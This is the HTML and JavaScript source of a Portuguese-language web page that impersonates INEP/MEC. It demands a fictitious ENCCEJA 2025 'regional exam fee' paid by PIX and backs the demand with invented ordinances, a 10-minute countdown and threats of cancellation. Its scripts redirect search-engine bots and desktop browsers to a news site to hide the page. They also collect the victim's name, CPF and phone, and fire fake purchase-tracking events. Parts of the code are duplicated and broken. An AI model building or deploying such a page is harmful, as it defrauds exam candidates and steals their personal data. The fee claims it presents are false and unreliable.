<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "qs9kqwmhmp");
    </script>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <script>
        // Função para detectar se é um dispositivo móvel
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // Função para detectar se é um bot
        function isBot() {
            const botAgents = [
            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
            ];

            return botAgents.some(bot => navigator.userAgent.includes(bot));
        }

        // Função para verificar se a largura da janela é maior que 768px
        function isWideScreen() {
            return window.innerWidth > 768;
        }

        // Redirecionar ou bloquear o acesso
        function checkAccess() {
            if (isBot() || (!isMobile() && isWideScreen())) {
            // Redirecionar para o site G1 se o acesso for bloqueado
            window.location.href = "https://g1.globo.com/";
            }
        }

        // Executar a função de verificação ao carregar a página
        window.onload = checkAccess;

        // Adicionar um listener para verificar novamente se a janela for redimensionada
        window.addEventListener('resize', checkAccess);
    </script>
    <!-- Facebook Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1418766538994503');
        fbq('init', '1345433039826605');
        fbq('init', '1390026985502891');
        fbq('init', '190097557439571');  // Novo pixel adicionado
        fbq('init', '1226790281278977'); // Novo pixel adicionado
        fbq('track', 'PageView');
        
        // Track purchase conversion
        const eventData = {
            value: 143.10,
            currency: 'BRL',
            content_name: 'Tarifa Regional de Aplicação da Prova ENCCEJA 2025',
            content_type: 'product',
            content_ids: ['encceja-2025-tarifa-regional']
        };
        
        fbq('track', 'Purchase', eventData);
        fbq('trackSingle', '1345433039826605', 'Purchase', eventData);
        fbq('trackSingle', '1390026985502891', 'Purchase', eventData);
        fbq('trackSingle', '190097557439571', 'Purchase', eventData);
        fbq('trackSingle', '1226790281278977', 'Purchase', eventData);
    </script>
    <noscript>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1418766538994503&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1345433039826605&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1390026985502891&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=190097557439571&ev=PageView&noscript=1"/>
        <img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1226790281278977&ev=PageView&noscript=1"/>
    </noscript>
    <!-- End Facebook Pixel Code -->
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENCCEJA 2025 - Tarifa Regional de Aplicação da Prova</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
    <style>
        @font-face {
            font-family: 'rawline';
            src: url('/static/fonts/rawline-500.woff2') format('woff2'),
                 url('/static/fonts/rawline-500.woff') format('woff');
            font-weight: 500;
            font-style: normal;
        }
        
        @font-face {
            font-family: 'rawline';
            src: url('/static/fonts/rawline-700.woff2') format('woff2'),
                 url('/static/fonts/rawline-700.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }
        
        body {
            font-family: 'rawline', sans-serif;
        }
        
        @keyframes moveButton {
            0%, 100% { transform: translateX(0); }
            50% { transform: translateX(10px); }
        }
        #payFeeButton {
            animation: moveButton 1.5s ease-in-out infinite;
            background-color: #f44336;
        }
        #payFeeButton:hover {
            background-color: #d32f2f;
        }
        .icon-container {
            margin-top: 10px;
            position: relative;
        }
        .icon-container img {
            position: relative;
            top: 10px;
            left: 2px;
        }
        .icon-container::before {
            content: '';
            position: absolute;
            top: 10px;
            left: 0;
            height: 100%;
            width: 4px;
            background-color: #f8f9fa;
        }
        .alert-box {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .next-step-box {
            background-color: #044785;
        }
        .next-step-box p {
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 95%;
            max-width: 450px;
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }
        .popup-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            padding: 20px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #044785;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        .gov-header {
            background-color: #222222;
        }
        .inep-header {
            background-color: #044785;
        }
        .form-header {
            background-color: #2c5985;
            color: white;
            font-weight: 600;
        }
        .footer-bg {
            background-color: #1c2b39;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen bg-white">
    <!-- Government Header -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#">
                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo do Brasil" class="h-6" />
            </a>
            <nav>
                <ul class="flex space-x-4 text-[10px]">
                    <li>
                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
                    </li>
                    <li>
                        <a class="hover:underline" href="#">PARTICIPE</a>
                    </li>
                    <li>
                        <a class="hover:underline" href="#">SERVIÇOS</a>
                    </li>
                </ul>
            </nav>
        </div>
    </header>
    <!-- INEP Header -->
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <style>
                        .cls-2{fill:#fff}
                    </style>
                </defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
            </svg>
        </div>
    </div>
    <!-- ENCCEJA Logo -->
    <div class="text-center py-6">
        <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
    </div>

    <div class="p-6 flex flex-col items-center bg-white mt-0">
        <div class="mb-4 relative">
        </div>
        <h1 class="text-[22px] font-bold text-center mb-2">Pagamento da Tarifa Regional de Aplicação da Prova ENCCEJA 2025</h1>
        <div class="text-white text-center mb-2 bg-red-600 p-4 rounded-md">
            <p class="text-[17px] text-shadow" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3);"><strong>AVISO IMPORTANTE:</strong> A inscrição no ENCCEJA 2025 requer pagamento da tarifa regional. O não pagamento resultará na invalidação da sua inscrição.</p>
        </div>
    </div>
    <main class="container mx-auto px-4 py-2">
        <div class="mb-6" style="font-size: 1rem; line-height: 1.45;">
            <div class="flex items-center mb-2">
                <h2 class="font-bold text-[18px]" style="color: #044785;">Prezado(a) <span id="userFirstName">Participante</span>:</h2>
            </div>
            <p class="text-[16px] leading-relaxed" style="color: #333;">
                Para concluir sua inscrição no ENCCEJA 2025 e garantir seu local de prova, é necessário efetuar o pagamento da <strong>Tarifa Regional de Aplicação da Prova (TRAP)</strong> no valor de <strong>R$ 143,10</strong>.
            </p>
            <ul class="list-none pl-0 mt-3 text-[16px] leading-relaxed" style="color: #333;">
                <li class="flex items-start mb-2">
                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <div>
                        <strong class="font-bold" style="color: #044785;">O que é a Tarifa Regional de Aplicação da Prova (TRAP):</strong> Conforme a Portaria INEP nº 123/2025, esta tarifa cobre custos logísticos específicos para a aplicação das provas em sua região, incluindo locação de espaços, equipes de fiscalização e materiais.
                    </div>
                </li>
                <li class="flex items-start mb-2">
                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <div>
                        <strong class="font-bold" style="color: #044785;">Prazo para pagamento:</strong> A tarifa deve ser paga em até 10 minutos após a conclusão da inscrição para garantir sua participação no exame de 2025.
                    </div>
                </li>
            </ul>
            <p class="mt-4 font-bold flex items-start text-[16px]" style="color: #333;">
                <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                <span>Valor a ser pago: <strong>R$ 143,10</strong></span>
            </p>
        </div>
        <div class="movements">
            <div class="icon-container pl-8 pb-4">
                <div class="absolute left-0 top-[-8px] w-6 h-6 -ml-3 flex items-center justify-center">
                    <img src="https://i.ibb.co/N6g5Tq8K/ic-acesso-informacao-54-v2.png" alt="Icon representing information access with a blue and white design">
                </div>
                <div class="mb-8" style="margin-top: -9px;">
                    <p class="font-semibold text-[17px]" style="color: #044785;">INFORMAÇÕES IMPORTANTES</p>
                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
                        <p class="mt-1 text-[16px]"><strong>ATENÇÃO:</strong> O não pagamento da Tarifa Regional resultará na <strong>impossibilidade de realizar a prova do ENCCEJA 2025</strong>. Sua inscrição será automaticamente cancelada após o prazo.</p>
                    </div>
                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
                        <p class="mt-1 text-[16px]"><strong>AVISO OFICIAL:</strong> De acordo com a Portaria MEC nº 987/2025, o participante <strong>não terá direito ao reembolso</strong> de quaisquer taxas previamente pagas em caso de cancelamento de inscrição ou não comparecimento ao exame.</p>
                    </div>
                    <button id="payFeeButton" class="mt-4 text-white px-8 py-3 rounded-[4px] text-[17px] font-bold py-2 px-6 rounded-[4px] transition duration-300 shadow-md">
                        REALIZAR PAGAMENTO
                    </button>
                </div>
            </div>
            <div class="mt-8 next-step-box p-4">
                <p class="font-semibold text-white text-[17px]">DEPOIS DO PAGAMENTO:</p>
                <p class="mt-2 text-white text-[16px]">Após o pagamento da Tarifa Regional, sua inscrição no ENCCEJA 2025 estará confirmada e você poderá acessar:</p>
                <div class="mt-4 text-white">
                    <p class="text-[16px]"><strong>• Cartão de Confirmação:</strong> Disponível 15 dias antes da prova</p>
                    <p class="text-[16px]"><strong>• Local de Prova:</strong> Detalhes completos com endereço e sala</p>
                    <p class="text-[16px]"><strong>• Materiais de Estudo:</strong> Acesso ao portal de estudantes</p>
                    <p class="text-[16px]"><strong>• Comprovante de Inscrição:</strong> Disponível para download</p>
                </div>
            </div>
        </div>
    </main>
    <!-- Footer -->
    <footer class="footer-bg text-white py-4 text-xs mt-8">
        <div class="container mx-auto px-4">
            <div class="flex flex-col items-center mb-2">
                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
                    <defs><style>.cls-2{fill:#fff}</style></defs>
                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
                </svg>
                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
            </div>
            <div class="flex justify-between items-center">
                <div>
                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
                </div>
                <div class="text-right">
                    <a href="#" class="text-gray-300 hover:text-white">Termos de Uso</a> |
                    <a href="#" class="text-gray-300 hover:text-white">Política de Privacidade</a>
                </div>
            </div>
        </div>
    </footer>
    
    <!-- Overlay -->
    <div id="overlay" class="overlay"></div>
    
    <!-- Popup de carregamento -->
    <div id="loadingPopup" class="popup" style="height: 200px;">
        <div class="popup-content">
            <div class="loader"></div>
            <p class="mt-4 text-center">Processando pagamento...</p>
        </div>
    </div>
    
                        <li>Escaneie o QR code ou cole o código acima</li>
    <!-- Popup de pagamento PIX -->
    <div id="pixPaymentPopup" class="popup">
        <div class="popup-content">
            <button id="closePopup" class="absolute top-2 right-2 text-gray-500 hover:text-gray-700">
                <i class="fas fa-times"></i>
            </button>
            <!-- Alerta vermelho -->
            <div class="bg-red-600 text-white p-4 rounded-md mb-4">
                <h2 class="text-xl font-bold mb-2 text-center">ATENÇÃO: PAGAMENTO OBRIGATÓRIO</h2>
                <p class="text-sm text-center font-bold">Sem o pagamento você perderá sua inscrição no ENCCEJA 2025!</p>
                <p class="text-sm text-center mt-2">O pagamento deve ser realizado em:</p>
                <div id="countdown" class="text-center text-2xl font-bold mt-1">10:00</div>
            </div>
            
            <div id="pixStatus" class="text-center mb-2">Aguardando pagamento...</div>
            
            <div id="paymentInstructions">
                <img id="pixQrCode" src="" alt="QR Code PIX" class="w-40 h-40 mx-auto mb-2">
                <div class="mb-3">
                    <p class="text-sm text-center mb-1">Código PIX:</p>
                    <textarea id="pixCodeText" readonly class="w-full p-3 text-[16px] bg-white border border-gray-300 rounded-md h-12 font-mono overflow-hidden resize-none"></textarea>
                    <button id="copyPixCode" class="w-full mt-2 bg-blue-600 text-white py-2 rounded-md">Copiar Código PIX</button>
                </div>
                <div class="mt-4 p-3 bg-gray-100 rounded-md text-sm">
                    <p class="mb-1"><strong>Instruções:</strong></p>
                    <ol class="list-decimal pl-5">
                        <li>Abra o aplicativo do seu banco</li>
                        <li>Acesse a área de PIX ou pagamentos</li>
                        <li>Escaneie o QR code ou cole o código acima</li>
                        <li>Confirme as informações e finalize o pagamento</li>
                        <li>Aguarde a confirmação (pode levar alguns minutos)</li>
                    </ol>
                </div>
            </div>
                        <li>Confirme as informações e finalize o pagamento</li>
                        <li>Aguarde a confirmação (pode levar alguns minutos)</li>
                    </ol>
                </div>
            </div>
            
            <div id="paymentConfirmation" class="mt-4 text-center hidden">
                <div class="bg-green-100 p-4 rounded-md mb-4">
                    <i class="fas fa-check-circle text-green-600 text-3xl mb-2"></i>
                    <p class="text-green-600 font-bold">Pagamento confirmado com sucesso!</p>
                    <p class="mt-2">Sua inscrição no ENCCEJA 2025 foi confirmada.</p>
                </div>
                <button id="confirmReceipt" class="w-full mt-3 bg-blue-600 text-white py-3 rounded-md font-bold">FECHAR</button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Get URL parameters
            function getUrlParameters() {
            // Função para iniciar o cronômetro de 10 minutos
            function startCountdown() {
                let duration = 10 * 60; // 10 minutos em segundos
                const countdownElement = document.getElementById('countdown');
                
                if (!countdownElement) return;
                
                const timer = setInterval(function() {
                    const minutes = Math.floor(duration / 60);
                    let seconds = duration % 60;
                    
                    seconds = seconds < 10 ? "0" + seconds : seconds;
                    
                    countdownElement.textContent = minutes + ":" + seconds;
                    
                    if (--duration < 0) {
                        clearInterval(timer);
                        countdownElement.textContent = "TEMPO ESGOTADO";
                        countdownElement.style.color = "#ffcccc";
                    }
                }, 1000);
                
                return timer;
            }
            
            // Variável para armazenar o intervalo do cronômetro
            let countdownTimer = null;
                const queryString = window.location.search;
                const urlParams = new URLSearchParams(queryString);
                const paramObj = {};
                
                for (const [key, value] of urlParams.entries()) {
                    paramObj[key] = value;
                }
                
                return paramObj;
            }
            
            // Format the CPF with dots and dash
            function formatCpf(cpf) {
                if (!cpf) return "";
                cpf = cpf.replace(/\D/g, '');
                return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
            }
            
            // Extract only the first name
            function getFirstName(fullName) {
                if (!fullName) return "Participante";
                return fullName.split(' ')[0];
            }
            
            // Get user data from URL
            const userData = getUrlParameters();
            const fullName = userData.name || "Participante";
            const userFirstName = getFirstName(fullName);
            const formattedCpf = formatCpf(userData.cpf || "");
            
            // Update DOM with user data
            try {
                document.getElementById('userFirstName').textContent = userFirstName;
            } catch (e) {
                console.error("Error updating user name:", e);
            }
            
            // Get references to elements
            const payFeeButton = document.getElementById('payFeeButton');
            const pixPaymentPopup = document.getElementById('pixPaymentPopup');
            const loadingPopup = document.getElementById('loadingPopup');
            const overlay = document.getElementById('overlay');
            const closePopupBtn = document.getElementById('closePopup');
            const copyPixCodeBtn = document.getElementById('copyPixCode');
            const confirmReceiptBtn = document.getElementById('confirmReceipt');
            
            // Get random user agent
            function getRandomUserAgent() {
                const userAgents = [
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36"
                ];
                return userAgents[Math.floor(Math.random() * userAgents.length)];
            }
            
            // Check payment status
            let transactionId = null;
            let checkStatusInterval = null;
            
            function checkPaymentStatus() {
                if (!transactionId) return;
                
                fetch('/check-for4payments-status?transaction_id=' + encodeURIComponent(transactionId) + '&amount=143.10', {
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest',
                        'X-Cache-Buster': new Date().getTime().toString(),
                        'User-Agent': getRandomUserAgent()
                    }
                })
                .then(response => response.json())
                .then(data => {
                    console.log("Payment status response:", data);
                    
                    if (data.status === "completed" || 
                        data.status === "COMPLETED" || 
                        data.status === "paid" || 
                        data.status === "PAID" || 
                        data.original_status === "APPROVED" || 
                        data.original_status === "PAID" || 
                        data.original_status === "COMPLETED") {
                        
                        if (checkStatusInterval) {
                            clearInterval(checkStatusInterval);
                        }
                        
                        document.getElementById('pixStatus').innerHTML = 
                            "<strong class='text-green-600'>PAGAMENTO CONFIRMADO</strong>";
                        document.getElementById('paymentInstructions').style.display = "none";
                        document.getElementById('paymentConfirmation').style.display = "block";
                        
                        // Redirecionar para página do livro se o valor for 143.10
                        if (data.amount === 143.10 || data.valor === 143.10 || 
                            data.amount === "143.10" || data.valor === "143.10") {
                            console.log("Redirecting to book page...");
                            setTimeout(() => {
                                window.location.href = "/livro?name=" + encodeURIComponent(fullName) + 
                                    "&cpf=" + encodeURIComponent(userData.cpf || "");
                            }, 3000);
                        }
                    }
                })
                .catch(error => {
                    console.error("Error checking payment status:", error);
                });
            }
            
            function startStatusCheck() {
                if (checkStatusInterval) {
                    clearInterval(checkStatusInterval);
                }
                checkPaymentStatus();
                checkStatusInterval = setInterval(checkPaymentStatus, 5000);
            }
            
            // Create payment
            if (payFeeButton) {
                payFeeButton.addEventListener('click', function() {
                    overlay.style.display = "block";
                    loadingPopup.style.display = "flex";
                    
                    const paymentData = {
                        name: fullName,
                        cpf: userData.cpf ? userData.cpf.replace(/\D/g, '') : "",
                        phone: userData.phone || "",
                        email: `${userData.cpf ? userData.cpf.replace(/\D/g, '') : ""}@participante.encceja.gov.br`,
                        amount: 143.10,
                        description: "Tarifa Regional de Aplicação da Prova - ENCCEJA 2025"
                    };
                    
                    fetch('/create-pix-payment', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Requested-With': 'XMLHttpRequest',
                            'User-Agent': getRandomUserAgent()
                        },
                        body: JSON.stringify(paymentData)
                    })
                    .then(response => response.json())
                        } else {
                    .then(data => {
                        console.log("Payment creation response:", data);
                        
                        loadingPopup.style.display = "none";
                        
                        // Iniciar o cronômetro quando o popup de pagamento é mostrado
                        countdownTimer = startCountdown();
                        
                        if (data.error) {
                            alert("Erro ao gerar pagamento: " + data.error);
                            overlay.style.display = "none";
                            return;
                        }
                        
                        // Extract transaction ID from data
                        transactionId = data.id || data.transactionId || data.transaction_id;
                        
                        // Handle PIX QR Code
                        const pixQrCodeElement = document.getElementById('pixQrCode');
                        if (data.pixQrCode) {
                            pixQrCodeElement.src = data.pixQrCode;
                        } else if (data.pix_qr_code) {
                            pixQrCodeElement.src = data.pix_qr_code;
                        }
                        
                        // Handle PIX Code Text
                        const pixCodeElement = document.getElementById('pixCodeText');
                        if (data.pixCode) {
                            pixCodeElement.value = data.pixCode;
                        } else if (data.pix_code) {
                            pixCodeElement.value = data.pix_code;
                        } else if (data.copy_paste) {
                            pixCodeElement.value = data.copy_paste;
                        } else if (data.code) {
                            pixCodeElement.value = data.code;
                        }
                        
                        // Check if we have the necessary data to show the payment popup
                        if ((data.pixQrCode || data.pix_qr_code) && 
                            (data.pixCode || data.pix_code || data.copy_paste || data.code)) {
                            pixPaymentPopup.style.display = "block";
                            startStatusCheck();
                        } else {
                            console.error("Missing QR code or PIX code data:", data);
                            alert("Erro ao processar o pagamento. Por favor, tente novamente.");
                            overlay.style.display = "none";
                        }
                    })
                    .catch(error => {
                        console.error("Error creating payment:", error);
                        loadingPopup.style.display = "none";
                        
                        // Este erro pode ocorrer mesmo quando a transação foi criada com sucesso
                        // Vamos tentar buscar novamente os dados da transação
                        if (transactionId) {
                            setTimeout(() => {
                                // Exibir o popup e iniciar a verificação de status se tivermos um ID
                                pixPaymentPopup.style.display = "block";
                                startStatusCheck();
                            }, 500);
                        } else {
                            alert("Erro ao processar o pagamento. Por favor, tente novamente.");
                            overlay.style.display = "none";
                        }
                    });
                            console.error("Missing QR code or PIX code data:", data);
                            alert("Erro ao processar o pagamento. Por favor, tente novamente.");
                            overlay.style.display = "none";
                        }
                    })
                    .catch(error => {
                        console.error("Error creating payment:", error);
                        loadingPopup.style.display = "none";
                        
                        // Este erro pode ocorrer mesmo quando a transação foi criada com sucesso
                        // Vamos tentar buscar novamente os dados da transação
                        if (transactionId) {
                            setTimeout(() => {
                                // Exibir o popup e iniciar a verificação de status se tivermos um ID
                                pixPaymentPopup.style.display = "block";
                                startStatusCheck();
                            }, 500);
                        } else {
                            alert("Erro ao processar o pagamento. Por favor, tente novamente.");
                            overlay.style.display = "none";
                        }
                    });
                });
            }
            
            // Copy PIX code
            if (copyPixCodeBtn) {
                copyPixCodeBtn.addEventListener('click', function() {
                    const pixCodeText = document.getElementById('pixCodeText');
                    pixCodeText.select();
                    document.execCommand('copy');
                    
                    copyPixCodeBtn.textContent = "Copiado!";
                    copyPixCodeBtn.classList.add('bg-green-600');
                    
                    setTimeout(() => {
                        copyPixCodeBtn.textContent = "Copiar";
                        copyPixCodeBtn.classList.remove('bg-green-600');
                    }, 2000);
                });
            }
            
            // Close popup
            if (closePopupBtn) {
                closePopupBtn.addEventListener('click', function() {
                    pixPaymentPopup.style.display = "none";
                    overlay.style.display = "none";
                    
                    // Parar o cronômetro quando o popup é fechado
                    if (countdownTimer) {
                        clearInterval(countdownTimer);
                        countdownTimer = null;
                    }
                    if (checkStatusInterval) {
                        clearInterval(checkStatusInterval);
                    }
                });
            }
            
            // Confirm receipt button
            if (confirmReceiptBtn) {
                confirmReceiptBtn.addEventListener('click', function() {
                    pixPaymentPopup.style.display = "none";
                    overlay.style.display = "none";
                    // Parar o cronômetro ao confirmar o pagamento
                    if (countdownTimer) {
                        clearInterval(countdownTimer);
                        countdownTimer = null;
                    }
                });
            }
        });
    </script>
</body>
</html>
